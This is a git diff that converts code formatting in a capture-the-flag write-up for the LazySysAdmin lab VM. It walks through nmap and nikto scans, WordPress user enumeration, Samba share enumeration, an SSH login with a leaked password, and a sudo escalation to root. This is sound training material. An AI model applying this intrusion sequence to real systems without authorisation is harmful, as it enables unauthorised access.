@@ -18,7 +18,7 @@ nmap -sn [network address]
 
 Once IP was found, lets do a port scan:
 nmap [target ip]
-`
+```
 Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-25 04:37 EST
 Nmap scan report for 192.168.56.101
 Host is up (0.00042s latency).
@@ -31,11 +31,11 @@ PORT     STATE SERVICE
 3306/tcp open  mysql
 6667/tcp open  irc
 MAC Address: 08:00:27:6F:9E:3B (Oracle VirtualBox virtual NIC)
-`
+```
 
 Interesting... Lets have comprehensive scan for more information:
 nmap -A [target ip]
-`
+```
 Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-25 04:37 EST
 Nmap scan report for 192.168.56.101
 Host is up (0.00037s latency).
@@ -100,12 +100,12 @@ Host script results:
 TRACEROUTE
 HOP RTT     ADDRESS
 1   0.37 ms 192.168.56.101
-`
+```
 
 
 Knowing that Port 80 is open, without opening the web browser yet, lets use `nikto`.
 nikto -host http://192.168.56.101
-`
+```
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:          192.168.56.101
@@ -145,7 +145,7 @@ nikto -host http://192.168.56.101
 + 7690 requests: 0 error(s) and 27 item(s) reported on remote host
 + End Time:           2017-12-25 04:41:39 (GMT-5) (30 seconds)
 ---------------------------------------------------------------------------
-`
+```
 
 `nikto` presented many useful information, but what caught my attention was `robots.txt` and `/wordpress`.
 So, was there a wordpress installation? Upon viewing http://192.168.56.101/wordpress, a wordpress page was presented. 
@@ -158,7 +158,7 @@ With the knowledge of the website having a default path for the login page, the 
 Using `wpscan`, we will be able to perform enumeration on wordpress apps.
 `wpscan --url http://192.168.56.101/wordpress/ --enumerate u`
 With the following output:
-`
+```
 [+] Enumerating usernames ...
 [+] Identified the following 1 user/s:
     +----+-------+---------+
@@ -167,7 +167,7 @@ With the following output:
     | 1  | admin | Admin – |
     +----+-------+---------+
 [!] Default first WordPress username 'admin' is still used
-`
+```
 
 NEVER keep the default admin. =)
 So of course, the first thing to try for login is "admin , admin". Well of course it didn't work. So I went on to try the brute force attack instead. Well... Don't bother trying if you are thinking about it. =)
@@ -176,11 +176,11 @@ We had to look somewhere else.. The system isn't just about the web application.
 Yeap, `samba` was available. But in what way was it vulerable? The first thing I tried was using `metasploit framework` to take advantage of known CVE, but that didn't work. So it was yet another brick wall. After slacking off for about an hour, the word *enumeration* came to my head. I went ahead googling *samba enumeration for metasploit* (well I was kinda lazy to do it the non msfconsole way). This link helped me [SAMBA ENUMERATION][smbenum].
 
 After running the enumeration, I was given the following output.
-`
+```
 [+] 192.168.56.101:139    - print$ - (DS) Printer Drivers
 [+] 192.168.56.101:139    - share$ - (DS) Sumshare
 [+] 192.168.56.101:139    - IPC$ - (I) IPC Service (Web server)
-`
+```
 
 Lets try \\192.168.56.101\share$
 Which gives us the following files!
@@ -199,7 +199,7 @@ Looking back at the \\192.168.56.101\share$, there was an interesting text file 
 
 Does that mean the password is "12345"?
 Well SSH was availble and I tried.
-`
+```
 Using username "togie".
 ##################################################################################################
 #                                          Welcome to Web_TR1                                    #
@@ -218,7 +218,7 @@ Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)
 0 updates are security updates.
 
 togie@LazySysAdmin:~$
-`
+```
 
 Terrific, I am in as a normal user through SSH! (Abandons php reverse shell)
 With no luck on `nmap` installation, I proceed to double confirm the OS type with "uname -a".
@@ -234,7 +234,7 @@ So I tried `sudo -i`, and proceeded to enter 'togie' password.
 Well this appears to be the most "straight forward" escalation, as it was intended. Nothing sophisticated was needed. Last but not least, the following commands to check for user, current working directory and list files. `whoami;pwd;ls -la`
 
 OUTPUT:
-`
+```
 root
 /root
 total 28
@@ -245,11 +245,11 @@ drwxr-xr-x 22 root root 4096 Aug 21 20:10 ..
 drwx------  2 root root 4096 Aug 14 20:30 .cache
 -rw-r--r--  1 root root  140 Feb 20  2014 .profile
 -rw-r--r--  1 root root  347 Aug 21 19:35 proof.txt
-`
+```
 
 Finally, `cat proof.txt`
 
-`
+```
 WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
 
 
@@ -270,7 +270,7 @@ WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
 2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7
 pf%&1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02
 bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu
-`
+```
 
 And that's it! Successfully found the treasure! (which is proof.txt)
 
